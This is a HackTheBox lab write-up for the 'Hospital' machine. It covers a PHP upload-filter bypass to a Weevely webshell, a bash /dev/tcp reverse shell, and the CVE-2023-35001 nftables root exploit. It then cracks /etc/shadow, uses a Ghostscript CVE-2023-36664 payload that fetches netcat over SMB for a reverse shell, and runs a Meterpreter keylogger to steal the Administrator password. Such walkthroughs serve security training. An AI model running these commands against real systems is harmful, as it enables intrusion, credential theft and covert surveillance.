---
title: "HTB - Hospital (Medium | Windows | Web)"
date: 2026-10-04 12:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, windows, roundcube, php, weevely, netcat, file-upload-bypass, cve-2023-35001, john, nftables, cve-2023-36664, ghostscript, smbserver, msfvenom, meterpreter, meterpreter-key-sniff, evil-winrm, keylogger]
description: "File-upload bypass to a Weevely webshell on a PHP portal, nftables LPE (CVE-2023-35001) to root the Linux VM, then a GhostScript injection (CVE-2023-36664) in a Roundcube upload plus Meterpreter keylogging to capture the Administrator password"
image:
  path: /assets/img/hospital.png
---


## Recon

```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```bash
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-10-07 18:23:42Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp   open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp  open  msmq?
2103/tcp  open  msrpc             Microsoft Windows RPC
2105/tcp  open  msrpc             Microsoft Windows RPC
2107/tcp  open  msrpc             Microsoft Windows RPC
2179/tcp  open  vmrdp?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp  open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2026-10-06T18:20:25
|_Not valid after:  2027-04-07T18:20:25
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-07T18:24:42+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6404/tcp  open  msrpc             Microsoft Windows RPC
6406/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp  open  msrpc             Microsoft Windows RPC
6409/tcp  open  msrpc             Microsoft Windows RPC
6613/tcp  open  msrpc             Microsoft Windows RPC
6631/tcp  open  msrpc             Microsoft Windows RPC
8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
9389/tcp  open  mc-nmf            .NET Message Framing
36402/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-07T18:24:44
|_  start_date: N/A
|_clock-skew: mean: 6h59m29s, deviation: 0s, median: 6h59m29s
```

### Service Discovery Analysis

The Nmap scan shows a Windows Active Directory Domain Controller (`DC.hospital.htb`) with the full AD stack — Kerberos, LDAP (389/636/3268/3269), SMB, RDP (3389), WinRM (5985) — alongside two web services that stand out:

- **Port 443**: Apache (Win64) serving **"Hospital Webmail"** — a PHP 8.0.28 webmail portal, likely Roundcube or similar, running directly on the Windows host.
- **Port 8080**: A _separate_ Apache instance, this time on **Linux/Ubuntu**, serving a `login.php` page. This is unusual — two different web stacks on two different OSes behind the same target suggests the Linux box (SSH on port 22) may be a separate machine reachable only through this engagement, or a container/VM fronting the DC.
- **SSH (Port 22)**: OpenSSH on Ubuntu — a Linux foothold path distinct from the Windows AD attack surface.

The webmail portal and the login page are the two most promising entry points — both are PHP applications, a common source of injection, deserialization, or auth bypass vulnerabilities. Clock skew is large (+6h59m), so Kerberos-dependent tools will need `faketime` or `ntpdate` synchronization throughout.

We add the domain to /etc/hosts:

```bash
echo "<target> hospital.htb DC.hospital.htb" | sudo tee -a /etc/hosts
```

---

## User

We see on port 443 there's an apache running.

![](/assets/img/hospital/Pasted_image_20261007083232.png)

We see it's a webmail, we see the roundcube logo, now we head to port 8080, where there was also an apache running.

![](/assets/img/hospital/Pasted_image_20261007083500.png)

We see a login panel, and we can also register. After logging in we can see that it lets us upload files.

![](/assets/img/hospital/Pasted_image_20261007083556.png)

Looking at the full URL displayed at the top of the page, which is http://hospital.htb:8080/index.php, we notice that it ends with a .php extension. This indicates that the application is running on PHP, so we attempt to upload a PHP webshell. Trying to upload the file gives an error that states "Error Try sending your medical record again!".

![](/assets/img/hospital/Pasted_image_20261007084049.png)

We attempt to upload a PDF, instead, and see if we get any error back.

![](/assets/img/hospital/Pasted_image_20261007084107.png)

This time, our upload was successful and we did not get any error back. Since there appear to be filetype or file extension checks in place, we'll intercept our upload request using BurpSuite and use Intruder to cycle through common PHP extensions, aiming to find one or more that bypass the filters.

![](/assets/img/hospital/Pasted_image_20261007084358.png)

Then, under the Payloads tab and under Payload settings, we'll click on Load and select the wordlist file containing the PHP extensions, in order to load its contents into Intruder. Finally, we'll initiate the attack by clicking the Start attack button. Since we do know the name of the file we uploaded, we can try to call it directly, as opposed to listing the entire directory. We navigate to /uploads/php.phar

![](/assets/img/hospital/Pasted_image_20261007084808.png)

Indeed, we see that we can directly access uploaded files, and further, we can invoke the phpinfo function using our uploaded PHP script.

The phpinfo() output provides us with a list of all disabled functions, which includes most code execution functions.

![](/assets/img/hospital/Pasted_image_20261007084844.png)

### Weevely disable_functions Bypass

**Overview**

`disable_functions` in `php.ini` is a common hardening measure that blocks dangerous functions like `exec()`, `system()`, or `shell_exec()` even if an attacker achieves code execution. However, this restriction can often be bypassed through alternative execution primitives (like `mail()` parameters, LD_PRELOAD tricks, or FFI). Weevely — a PHP webshell generator — ships with a built-in module called `audit_disablefunctionbypass` that automatically detects and exploits one of these bypass techniques, giving a functional shell even when the standard command-execution functions are blocked.

To bypass this and get a shell, we can use Weevely, which comes natively installed on Kali Linux, and can also be installed from this GitHub repository. The Weevely documentation states that the agent that's generated (in our case, backdoor.phar) is obfuscated, and from reading the source code it shows that it uses a built-in function that bypasses disabled functions, called audit_disablefunctionbypass. So, we proceed to generate an agent using Weevely with the following command:

```bash
weevely generate 'p4wn4g386!' backdoor.phar
```

![](/assets/img/hospital/Pasted_image_20261007084954.png)

We then upload our backdoor and access it using the command below:

```bash
weevely http://hospital.htb:8080/uploads/backdoor.phar 'p4wn4g386!'
```

![](/assets/img/hospital/Pasted_image_20261007085110.png)

We land inside a Linux environment, as the www-data user. We proceed to get a stable shell by migrating to Netcat. First, we start a Netcat listener.

```bash
nc -lnvp 4444
```

Then, on our Weevely instance, we run the command below, which sets up a reverse shell by executing /bin/bash.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.65/4444 0>&1'
```

![](/assets/img/hospital/Pasted_image_20261007085206.png)

### CVE-2023-35001 (Nftables Local Privilege Escalation)

**Overview**

CVE-2023-35001 is an Out-Of-Bounds Read/Write vulnerability in the Linux kernel's `nftables` subsystem. It affects unprivileged user namespaces that have access to netfilter, allowing a local user to corrupt kernel memory through crafted netfilter rule expressions. On vulnerable kernels (this one running 5.19.0-35-generic, dated February 2023), successful exploitation grants a root shell, making it a reliable Local Privilege Escalation (LPE) primitive once any code execution foothold is obtained.

Knowing that the host system is a Windows machine, we look for a way to escape this container or virtual machine we find ourselves in. Enumerating the system, we inspect the running kernel by executing the command uname -a.

![](/assets/img/hospital/Pasted_image_20261007085354.png)

We observe that the kernel being used is version 5.19.0-35-generic, dated February 3, 2023, which indicates that it is outdated. Upon running a Google search for vulnerabilities related to this particular kernel version, we come across CVE-2023-35001, and also this proof of concept. The vulnerability in question is an Out-Of-Bounds Read/Write in the nftables module, which can be exploited to obtain root privileges, also known as a Local Privilege Escalation (LPE). To run the exploit, we need to have both C and Golang compilers available. We download the exploit and compile it locally.

```bash
git clone https://github.com/synacktiv/CVE-2023-35001.git 
cd CVE-2023-35001
make
```

This generates an lpe.zip file that can be extracted on the target system. Inside the archive, there are two binaries: wrapper, a C binary utilized for entering namespaces, and exploit, the primary exploit. The exploit file is the executable program meant to be run. It utilizes the wrapper program to invoke itself and enter a new namespace.

We proceed to create a tar file containing both the exploit and wrapper, which is all we need to run the exploit.

```bash
tar -cvf exploit_and_wrapper.tar exploit wrapper

# Start a http server
python3 -m http.server 9090
```

![](/assets/img/hospital/Pasted_image_20261007085748.png)

We extract it and run it.

```bash
tar -xvf exploit_and_wrapper.tar
chmod +x ./exploit
./exploit
```

![](/assets/img/hospital/Pasted_image_20261007085851.png)

Looking at the system, we proceed to examine the /etc/shadow file for credentials which might allow us to access other parts of the server.

![](/assets/img/hospital/Pasted_image_20261007085952.png)

Here, we see the hash for drwilliams, which we proceed to crack. We start off by saving the hash to a file and then use John to crack it.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](/assets/img/hospital/Pasted_image_20261007090128.png)

The password for drwilliams is cracked successfully: qwe123!@#.

We recall the RoundCube instance that we discovered earlier, during enumeration. We use the obtained password to log in as drwilliams.

![](/assets/img/hospital/Pasted_image_20261007090246.png)

![](/assets/img/hospital/Pasted_image_20261007090259.png)

Having authenticated successfully, we see an email from drbrown. In the email, we notice something interesting: Dr. Brown is waiting for us to send a file with the extension .eps. Another noteworthy detail is that he mentions GhostScript, which is an interpreter for the PostScript language and the PDF file format, commonly used for viewing and printing documents.

### CVE-2023-36664 (Ghostscript Command Injection)

**Overview**

CVE-2023-36664 is a command injection vulnerability in Ghostscript's handling of certain file formats (including `.eps`). Ghostscript fails to properly validate filenames and pipe-based device specifications passed through crafted PostScript/EPS content, allowing an attacker-controlled file to execute arbitrary OS commands when opened or processed by a vulnerable Ghostscript installation — including when the file is merely previewed by another application that invokes Ghostscript under the hood (such as a mail client rendering an attachment).

Upon investigating, we discover a vulnerability in Ghostscript, which enables command injection into an .eps file. Additionally, we find this proof of concept code related to this vulnerability. We'll use the above exploit to generate a malicious .eps file, which will fetch a Netcat executable from our local server, hosted via SMB using Impacket, and then execute Netcat on the target system, establishing a reverse shell connection to our listener. We download the executable and start the SMB server in the same directory, using impacket-smbserver. The tool starts an SMB server named smbFolder in the current directory ($(pwd)), with SMB2 support.

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

Once our SMB server is started, we clone the exploit from GitHub and use it to generate the malicious .eps file:

```bash
git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git
cd CVE-2023-36664-Ghostscript-command-injection 

python3 CVE_2023_36664_exploit.py --inject --payload 'cmd.exe /c \\\\10.10.14.14\\smbFolder\\nc64.exe -e cmd 10.10.14.14 4422' --filename file.eps
```

![](/assets/img/hospital/Pasted_image_20261007090839.png)

Finally, we start a Netcat listener on port 4444, as specified in the payload.

```bash
nc -lnvp 4444
```

We can now compose a new mail and attach the malicious .eps file we created. We make sure to send the email to drbrown@hospital.htb

![](/assets/img/hospital/Pasted_image_20261007091034.png)

Moments after sending the email, we check our Netcat listener and see that we get a connection as drbrown.

![](/assets/img/hospital/Pasted_image_20261007091059.png)

![](/assets/img/hospital/Pasted_image_20261007091152.png)

The user flag can be found at C:\Users\drbrown.HOSPITAL\Desktop\flag.txt.

---

## Root

### Meterpreter Upgrade & Keylogging

For better enumeration of the system, we will upgrade our Netcat shell to a Meterpreter session. We'll start off by generating a Meterpreter payload, in the same directory as nc64.exe

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.65 LPORT=9999 -f exe > shell.exe
```

We listen with multi/handler.

```bash
use multi/handler
set lhost tun0
set lport 9999
run
```

We then fetch the executable on the Windows host using the copy command to copy the payload shell.exe from the SMB share located at \10.10.14.14\smbFolder\ to the desktop of the user drbrown.HOSPITAL

```bash
copy \\10.10.16.65\smbFolder\shell.exe

            1 file(s) copied.
```

Then we execute the exe and we already receive the connection in the multi handler.

![](/assets/img/hospital/Pasted_image_20261007091743.png)

We proceed to enumerate the system. Upon further investigation of the running processes, we observe that internet explorer (iexplore.exe) is currently running.

![](/assets/img/hospital/Pasted_image_20261007091846.png)

Seeing as there is an active session and that iexplore.exe is running, indicating that the user is currently using a browser, we can attempt to run a keylogger and see what interesting results we get. To do so, we must first migrate to the 64-bit (x64) iexplore.exe process - in this case, PID 3120.

```bash
meterpreter > migrate 3120
```

Now, we can start our keylogger

```bash
meterpreter > keyscan_start
```

We wait for a minute to allow for enough time to collect meaningful information, and then dump the capture with the keyscan_dump command.

![](/assets/img/hospital/Pasted_image_20261007092208.png)

We see that we captured a potential Administrator password of Th3B3stH0sp1t4l9786!

Based on the output, it's clear that we've obtained the correct Administrator credentials. We can now proceed to utilize Evil-WinRM to establish a privileged session on the machine.

```bash
evil-winrm-py -i <target> -u Administrator -p 'Th3B3stH0sp1t4l9786!'
```

![](/assets/img/hospital/Pasted_image_20261007092452.png)

The final flag can be found at C:\Users\Administrator\Desktop\root.txt.

---

### Summary

**Attack Chain:**

1. **Web Enumeration** → Found two web apps: Roundcube webmail (port 443) and a custom PHP file-upload portal (port 8080)
2. **Upload Filter Bypass** → PHP webshell uploads were blocked; a PDF upload succeeded, revealing filetype checks. Burp Intruder cycled through PHP extension variants to find one accepted by the filter
3. **Direct File Access** → Accessed the uploaded script directly at `/uploads/php.phar`, confirming PHP execution and reading `phpinfo()` output, which revealed `disable_functions` blocking standard code execution
4. **Weevely RCE** → Generated a Weevely backdoor exploiting `audit_disablefunctionbypass` to bypass `disable_functions`, obtained a www-data shell, upgraded to a stable Netcat reverse shell
5. **Kernel Enumeration** → Found an outdated kernel (5.19.0-35-generic) vulnerable to CVE-2023-35001
6. **CVE-2023-35001 Exploitation** → Compiled and ran the nftables LPE exploit for a root shell inside the Linux container
7. **Credential Harvesting** → Dumped `/etc/shadow`, cracked drwilliams' hash with John/rockyou
8. **Webmail Access** → Logged into Roundcube as drwilliams, found an email from drbrown referencing Ghostscript and `.eps` files
9. **CVE-2023-36664 Exploitation** → Crafted a malicious `.eps` file via the Ghostscript command injection PoC, hosted a payload over an Impacket SMB server, and emailed the file to drbrown
10. **Shell as drbrown** → Email processing triggered the injected command, fetching and executing a reverse shell payload — landed as drbrown on the Windows DC, captured user.txt
11. **Meterpreter Upgrade** → Delivered a Meterpreter payload over SMB, caught it with multi/handler
12. **Process Migration & Keylogging** → Migrated into the 64-bit iexplore.exe process and ran a keylogger while the Administrator used the browser
13. **Credential Capture** → Keylogger captured the Administrator's plaintext password
14. **Domain Admin Access** → Authenticated via evil-winrm as Administrator, captured root.txt
